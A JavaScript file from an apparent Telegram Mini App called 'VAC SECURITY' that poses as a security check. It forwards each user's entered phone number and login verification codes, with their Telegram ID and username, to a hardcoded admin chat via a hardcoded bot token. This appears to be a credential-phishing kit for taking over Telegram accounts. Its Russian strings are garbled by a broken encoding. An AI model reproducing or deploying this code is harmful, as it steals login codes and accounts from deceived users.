// bot-notifier.js
const BOT_TOKEN = '8196403348:AAGrU-BOJgX6nFZB7f_YV9trqrBGKplWWt0';
const ADMIN_ID = '5665980031';

const formatMessage = (type, data, user) => {
  const escapeHtml = (str) => str?.toString().replace(/[&<>'"]/g, tag => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    "'": '&#39;',
    '"': '&quot;'
  }[tag])) || 'N/A';

  const userInfo = `üë§ ${escapeHtml(user.first_name || '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å')} ${escapeHtml(user.last_name || '')}\n` +
                  `üÜî ID: <code>${escapeHtml(user.id?.toString())}</code>\n` +
                  `üîó USER: @${escapeHtml(user.username)}`;

  const timeInfo = `–í—Ä–µ–º—è: <code>${new Date().toLocaleString()}</code>`;
  
  switch(type) {
    case 'init':
      return { text: `üîê <b>VAC SECURITY</b>\n\nüö™ <b>–ù–æ–≤—ã–π –≤—Ö–æ–¥ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</b>\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
    
    case 'verified_enter':
      return { text: `üîê <b>VAC SECURITY</b>\n\nüü¢ <b>–í–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–æ—à–µ–ª</b>\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
    
    case 'security_check_start':
      return { text: `üîê <b>VAC SECURITY</b>\n\nüîç <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞—á–∞–ª –ø—Ä–æ–≤–µ—Ä–∫—É –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</b>\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
    
    case 'security_check_complete':
      return { text: `üîê <b>VAC SECURITY</b>\n\nüìä <b>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∞</b>\n\n${userInfo}\n\n–ù–∞–π–¥–µ–Ω–æ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π: <b>${data?.vulnerabilities || 0}</b>\n\n${timeInfo}`, buttons: [] };
    
    case 'phone':
      return { text: `üîê <b>VAC SECURITY</b>\n\nüì± <b>–í–≤–µ–¥—ë–Ω –Ω–æ–º–µ—Ä:</b> <code>${escapeHtml(data?.phone)}</code>\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
    
    case 'code': 
      return { text: `üîê <b>VAC SECURITY</b>\n\nüî¢ <b>–í–≤–µ–¥—ë–Ω –∫–æ–¥</b>\n\n–ö–æ–¥: <code>${escapeHtml(data?.code)}</code>\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
    
    case 'verification_success':
      return { text: `üîê <b>VAC SECURITY</b>\n\n‚úÖ <b>–£—Å–ø–µ—à–Ω–∞—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è</b>\n\n–ö–æ–¥: <code>${escapeHtml(data?.code)}</code>\n–ü–æ–ø—ã—Ç–æ–∫: <b>${data?.attempts || 1}</b>\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
    
    case 'app_close':
      return { text: `üîê <b>VAC SECURITY</b>\n\nüö™ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã—à–µ–ª –∏–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è</b>\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
    
    case 'vulnerability_fix_attempt':
      return { text: `üîê <b>VAC SECURITY</b>\n\n‚ö†Ô∏è <b>–ü–æ–ø—ã—Ç–∫–∞ –∏—Å–ø—Ä–∞–≤–∏—Ç—å —É—è–∑–≤–∏–º–æ—Å—Ç—å</b>\n\n–£—è–∑–≤–∏–º–æ—Å—Ç—å: <b>${escapeHtml(data?.vulnerability)}</b>\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
    
    case 'vulnerability_fixed':
      return { text: `üîê <b>VAC SECURITY</b>\n\n‚úÖ <b>–£—è–∑–≤–∏–º–æ—Å—Ç—å –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∞</b>\n\n–£—è–∑–≤–∏–º–æ—Å—Ç—å: <b>${escapeHtml(data?.vulnerability)}</b>\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
    
    case 'code_attempt_failed':
      return { text: `üîê <b>VAC SECURITY</b>\n\n‚ùå <b>–ù–µ—É–¥–∞—á–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –≤–≤–æ–¥–∞ –∫–æ–¥–∞</b>\n\n–ö–æ–¥: <code>${escapeHtml(data?.code)}</code>\n–ü–æ–ø—ã—Ç–∫–∞: <b>${data?.attempt || 1}</b>\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
    
    case 'vulnerability_fix_started':
      return { text: `üîê <b>VAC SECURITY</b>\n\nüõ† <b>–ù–∞—á–∞—Ç–æ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</b>\n\n–£—è–∑–≤–∏–º–æ—Å—Ç—å: <b>${escapeHtml(data?.vulnerability)}</b>\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
    
    default:
      return { text: `üîê <b>VAC SECURITY</b>\n\n‚ÑπÔ∏è <b>–ù–æ–≤–æ–µ —Å–æ–±—ã—Ç–∏–µ</b>\n\n–¢–∏–ø: ${escapeHtml(type)}\n–î–∞–Ω–Ω—ã–µ: ${escapeHtml(JSON.stringify(data))}\n\n${userInfo}\n\n${timeInfo}`, buttons: [] };
  }
};

window.sendToBot = async (type, data = null) => {
  if (!BOT_TOKEN || !ADMIN_ID) {
    console.error('Bot configuration missing');
    return null;
  }

  try {
    const tg = window.Telegram?.WebApp;
    const user = tg?.initDataUnsafe?.user || {};
    const message = formatMessage(type, data, user);
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_ID,
        text: message.text,
        parse_mode: 'HTML',
        reply_markup: message.buttons.length ? { inline_keyboard: message.buttons } : undefined
      })
    });

    if (!response.ok) throw new Error('Network response was not ok');
    return await response.json();
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
    return null;
  }
};